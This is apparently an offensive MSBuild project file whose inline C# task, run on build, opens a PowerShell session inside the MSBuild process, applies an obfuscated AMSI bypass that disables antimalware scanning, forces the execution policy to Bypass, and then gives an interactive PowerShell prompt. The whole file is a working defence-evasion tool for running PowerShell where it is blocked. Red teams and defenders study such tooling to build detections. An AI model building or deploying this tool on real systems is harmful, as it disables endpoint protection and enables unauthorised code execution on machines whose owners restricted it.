<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003" ToolsVersion="4.0">
  <ItemGroup>
    <Reference Include="System" />
    <Reference Include="System.Core" />
    <Reference Include="System.Xml.Linq" />
    <Reference Include="System.Data.DataSetExtensions" />
    <Reference Include="Microsoft.CSharp" />
    <Reference Include="System.Data" />
    <Reference Include="System.Net" />
    <Reference Include="System.Xml" />
    <Reference Include="System.Management.Automation" />
  </ItemGroup>
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory" AssemblyFile="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Using Namespace="System" />
      <Using Namespace="System.Reflection" />
      <Using Namespace="System.Diagnostics" />
      <Using Namespace="System.Net" />
      <Using Namespace="System.IO" />
      <Using Namespace="System.Management.Automation" />
      <Reference Include="System.Management.Automation" />
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System;
        using System.IO;
        using System.Collections.ObjectModel;
        using System.Management.Automation;
        using System.Management.Automation.Runspaces;
        using System.Threading;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;

        public class ClassExample : Task
        {
            public override bool Execute()
            {
                // Start a separate thread for PowerShell execution to avoid blocking MSBuild
                Thread powerShellThread = new Thread(RunPowerShell);
                powerShellThread.Start();
                
                // Wait for the thread to complete to ensure proper execution
                powerShellThread.Join();
                return true;
            }

            private void RunPowerShell()
            {
                Runspace rs = RunspaceFactory.CreateRunspace();
                rs.Open();
                PowerShell ps = PowerShell.Create();
                ps.Runspace = rs;
                string currentDirectory = Directory.GetCurrentDirectory();

                Console.WriteLine("PS " + currentDirectory + ">");

                // AMSI bypass code
                string amsiBypass = @"
                $A=""5492868772801748688168747280728187173688878280688776828""
                $B=""1173680867656877679866880867644817687416876797271""
                [Ref].""A`ss`Embly"".""GET`TY`Pe""([string](0..37|%{[char][int](29+($A+$B).
                substring(($_*2),2))})-replace "" "" ).
                GetField([string](38..51|%{[char][int](29+($A+$B).
                substring(($_*2),2))})-replace "" "",'NonPublic,Static').
                SetValue($null,$true)
                ";

                // Execute AMSI bypass
                try
                {
                    ps.AddScript(amsiBypass);
                    ps.Invoke();
                    ps.Commands.Clear();
                    Console.WriteLine("AMSI bypass applied successfully.");
                }
                catch (Exception e)
                {
                    Console.WriteLine("ERROR: Failed to apply AMSI bypass: " + e.Message);
                    rs.Close();
                    return;
                }

                // Set execution policy to Bypass
                try
                {
                    ps.AddScript("Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force");
                    ps.Invoke();
                    ps.Commands.Clear();
                    Console.WriteLine("Execution policy set to Bypass.");
                }
                catch (Exception e)
                {
                    Console.WriteLine("ERROR: Failed to set execution policy: " + e.Message);
                    rs.Close();
                    return;
                }

                // Interactive PowerShell loop
                while (true)
                {
                    Console.Write("PS " + currentDirectory + "> ");
                    string cmd = Console.ReadLine();
                    if (string.IsNullOrWhiteSpace(cmd)) continue;

                    try
                    {
                        // Handle 'exit' command
                        if (cmd.Trim().ToLower() == "exit")
                        {
                            Console.WriteLine("Exiting PowerShell session...");
                            break;
                        }

                        // Handle directory navigation
                        if (cmd.StartsWith("cd ") || cmd.StartsWith("Set-Location"))
                        {
                            string targetPath = cmd.Substring(cmd.IndexOf(" ") + 1).Trim().Replace("\"", "");
                            if (Directory.Exists(targetPath))
                            {
                                Directory.SetCurrentDirectory(targetPath);
                                currentDirectory = Directory.GetCurrentDirectory();
                                ps.AddScript("Set-Location \"" + currentDirectory + "\"").Invoke();
                                ps.Commands.Clear();
                            }
                            else
                            {
                                Console.WriteLine("The system cannot find the path specified: " + targetPath);
                            }
                            continue;
                        }

                        // Execute the command and capture output
                        ps.AddScript(cmd + " | Out-String");
                        Collection<PSObject> psOutput = ps.Invoke();
                        Collection<ErrorRecord> errors = ps.Streams.Error.ReadAll();

                        // Handle errors
                        if (errors.Count > 0)
                        {
                            Console.WriteLine();
                            foreach (ErrorRecord error in errors)
                            {
                                Console.WriteLine("ERROR: " + error.ToString());
                            }
                        }

                        // Display output
                        if (psOutput.Count > 0)
                        {
                            Console.WriteLine();
                            foreach (PSObject output in psOutput)
                            {
                                if (output != null)
                                {
                                    Console.WriteLine(output.ToString());
                                }
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine();
                        Console.WriteLine("**** ERROR ****");
                        Console.WriteLine(e.Message);
                    }
                    finally
                    {
                        ps.Commands.Clear();
                    }
                }

                rs.Close();
            }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
